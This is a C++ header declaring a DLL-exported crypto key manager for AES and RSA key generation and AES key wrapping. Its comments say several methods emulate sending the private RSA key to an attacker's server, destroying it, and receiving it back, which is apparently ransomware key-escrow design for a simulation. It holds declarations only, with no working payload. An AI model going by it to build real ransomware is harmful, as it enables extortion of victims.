#pragma once

#include <string>
#include <vector>
#include "..\include\singleton.hpp"

/**
 * @brief A manager class responsible for cryptographic operations.
 */
class CryptoKeyManager final : public Singleton<CryptoKeyManager>
{
	friend class __declspec(dllexport) Singleton<CryptoKeyManager>;
	__declspec(dllexport) CryptoKeyManager();

public:
	/**
	 * @brief Structure representing an AES key, including both the key and IV.
	 */
	struct AESKey
	{
		static constexpr int KEY_ENCRYPTED_SIZE{ 256 };	///< The encrypted AES key size in bytes.
		static constexpr int KEY_SIZE{ 16 };			///< The AES key size in bytes.
		static constexpr int IV_SIZE{ 16 };				///< The IV size in bytes.

		std::vector<unsigned char> key;					///< The AES key.
		std::vector<unsigned char> iv;					///< The Initialization Vector (IV).

		AESKey() = default;

		/**
		 * @brief Checks if the AES key is encrypted.
		 *
		 * @return true If the key size is equal to RSA key size.
		 * @return false Otherwise.
		 */
		bool isEncrypted() const { return key.size() == KEY_ENCRYPTED_SIZE; }
	};

	__declspec(dllexport) ~CryptoKeyManager();

	/**
	* @brief Generates an AES key.
	*
	* @param aesKey Pointer to AESKey structure where the generated key will be stored.
	* @return true If the AES key was successfully generated.
	* @return false Otherwise.
	*/
	__declspec(dllexport) bool generateAESKey(AESKey* aesKey);

	/**
	 * @brief Generates an RSA key.
	 *
	 * @return true If the RSA key was successfully generated.
	 * @return false Otherwise.
	 */
	__declspec(dllexport) bool generateRSAKey();

	/**
	 * @brief Saves the RSA keys to a specified file path.
	 * The real purpouse of this method is to emulate the private key being sent to the attacker's server.
	 *
	 * @param path The file path to save the keys to.
	 * @return true If the private key were successfully saved.
	 * @return false Otherwise.
	 */
	__declspec(dllexport) bool sendKeysTo(const char* path);

	/**
	 * @brief Destroys the private RSA key.
	 * This method is called after the private key is sent to the attacker's server.
	 *
	 * @return true If the private key was successfully destroyed.
	 * @return false Otherwise.
	 */
	__declspec(dllexport) bool destroyPrivateKey();

	/**
	 * @brief Reads the private key from a specified file path.
	 * This method is called after the private key is received from the attacker's server.
	 *
	 * @param path The file path to read the private key from.
	 * @return true If the private key was successfully readed.
	 * @return false Otherwise.
	 */
	__declspec(dllexport) bool receivePrivateKeyFrom(const char* path);

	/**
	 * @brief Restores public key from the private key.
	 * This method is simulating the public key being received from the attacker's server.
	 * 
	 * @param path The file path to private key from which the public key will be restored.
	 * @return true If the public key was successfully restored.
	 * @return false Otherwise.
	 */
	__declspec(dllexport) bool restorePublicKeyFrom(const char* path);

	/**
	 * @brief Encrypts an AES key using the public RSA key.
	 *
	 * @param aesKey Pointer to AESKey structure to be encrypted.
	 * @return true If the AES key was successfully encrypted.
	 * @return false Otherwise.
	 */
	__declspec(dllexport) bool encryptAESKey(AESKey* aesKey);

	/**
	 * @brief Decrypts an AES key. For proper decryption the private RSA key must be loaded.
	 *
	 * @param aesKey Pointer to AESKey structure to be decrypted.
	 * @return true If the AES key was successfully decrypted.
	 * @return false Otherwise.
	 */
	__declspec(dllexport) bool decryptAESKey(AESKey* aesKey);

	/**
	 * @brief Gets the last error message.
	 *
	 * @return const char* The last error message.
	 */
	__declspec(dllexport) const char* getLastError();

private:
	/**
	 * @brief Collects the last OpenSSL error.
	 */
	void collectLastError();

	/**
	 * @brief Checks if a private key is available.
	 *
	 * @return true If a private key is available.
	 * @return false Otherwise.
	 */
	bool hasPrivateKey();
};